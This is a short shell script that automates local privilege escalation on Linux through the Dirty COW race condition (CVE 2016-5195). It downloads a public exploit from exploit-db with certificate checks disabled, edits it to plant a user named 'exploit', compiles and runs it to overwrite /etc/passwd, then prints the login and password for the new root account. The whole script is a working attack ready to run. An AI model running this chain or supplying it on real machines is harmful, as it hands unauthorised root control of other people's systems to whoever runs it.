# Local escalation with CVE 2016-5195 (Race condition with /etc/passwd)

grn=$'\e[1;32m'
end=$'\e[0m'

wget --no-check-certificate https://www.exploit-db.com/download/40839
mv 40839 40839.c
sed -i 's/firefart/exploit/g' 40839.c
gcc -pthread 40839.c -o exploit-40839-cve-2016-5195 -lcrypt
sh -c './exploit-40839-cve-2016-5195 exploit' &
printf "${grn}Type: "su - exploit"${end}\n${grn}Password: exploit${end}\n${grn} Type "echo 0 > /proc/sys/vm/dirty_writeback_centisecs" to limit undefined behaviour once logged.${end}"
